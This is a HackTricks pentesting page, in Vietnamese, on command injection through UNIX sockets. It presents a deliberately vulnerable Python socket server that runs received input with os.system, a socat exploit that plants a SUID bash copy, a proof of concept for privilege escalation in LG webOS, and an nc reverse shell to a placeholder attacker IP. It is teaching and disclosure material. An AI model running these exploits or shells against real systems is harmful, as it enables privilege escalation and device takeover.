# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Ví dụ liên kết socket bằng Python

Trong ví dụ sau, một **unix socket được tạo** (`/tmp/socket_test.s`) và mọi thứ **nhận được** sẽ được **thực thi** bởi `os.system`. Tôi biết bạn sẽ không bắt gặp trường hợp này ngoài thực tế, nhưng mục tiêu của ví dụ là cho thấy mã sử dụng unix socket trông như thế nào và cách xử lý đầu vào trong trường hợp tệ nhất có thể.

```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
  os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

**Thực thi** mã bằng python: `python s.py` và **kiểm tra socket đang lắng nghe như thế nào**:

```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```

**Exploit**

```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```

## Nghiên cứu tình huống: Leo thang đặc quyền được kích hoạt bằng signal qua UNIX socket do root sở hữu (LG webOS)

Một số daemon đặc quyền cung cấp UNIX socket do root sở hữu, nhận đầu vào không đáng tin cậy và gắn các hành động đặc quyền với thread-ID và signal. Nếu giao thức cho phép client không đặc quyền kiểm soát native thread nào sẽ bị nhắm tới, bạn có thể kích hoạt một code path đặc quyền và leo thang đặc quyền.<sup>[[1]](#references)[[2]](#references)</sup>

Bài viết phân tích chính và thông tin công bố mô tả trình tự sau.<sup>[[1]](#references)[[2]](#references)</sup>

Mẫu quan sát được:
- Kết nối tới một socket do root sở hữu (ví dụ: /tmp/remotelogger).
- Tạo một thread và lấy native thread id (TID) của nó.
- Gửi TID (được đóng gói) cùng phần đệm làm request; nhận acknowledgement.
- Gửi một signal cụ thể tới TID đó để kích hoạt hành vi đặc quyền.

PoC rút gọn bên dưới mô phỏng trình tự đó.<sup>[[1]](#references)[[2]](#references)</sup>
Phác thảo PoC tối giản:

```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```

Để biến điều này thành root shell, có thể sử dụng một mẫu named-pipe + nc đơn giản.<sup>[[2]](#references)</sup>

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```

Ghi chú:
- Loại lỗi này phát sinh khi tin cậy các giá trị bắt nguồn từ trạng thái của client không đặc quyền (TID) rồi gắn chúng với signal handler hoặc logic có đặc quyền.<sup>[[1]](#references)</sup>
- Tăng cường bảo mật bằng cách áp dụng xác thực trên socket, xác thực định dạng thông điệp và tách các thao tác có đặc quyền khỏi các định danh luồng do bên ngoài cung cấp.

## References

- [1] [Jailbreak webOS cho vui (chỉ để giải trí)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV: Path Traversal, vượt qua xác thực và chiếm quyền kiểm soát hoàn toàn thiết bị (công bố của SSD)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
